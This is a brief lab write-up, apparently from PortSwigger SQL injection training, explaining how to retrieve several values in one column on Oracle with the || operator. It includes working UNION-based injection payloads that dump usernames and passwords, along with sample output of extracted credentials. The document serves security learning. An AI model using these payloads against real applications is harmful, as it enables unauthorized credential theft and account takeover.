# Retrieving multiple values within a single column

For example, on Oracle you could submit the input:
```bash
' UNION SELECT username || '~' || password FROM users--
```
This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle.
The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:
```bash
administrator~s3cure
wiener~peter
carlos~montoya
```
## Lab
**Task**: Dump password and users from databases.<br>

**Solution**: After finding number of columns using  `union select` attack
I used this payload:<br>
`'UNION SELECT NULL,username||'~'||password FROM users--`


https://github.com/offensivecyber03/PortSwigger/assets/71892943/8201f6b3-9105-4c71-83b5-1963fe7dcf4e


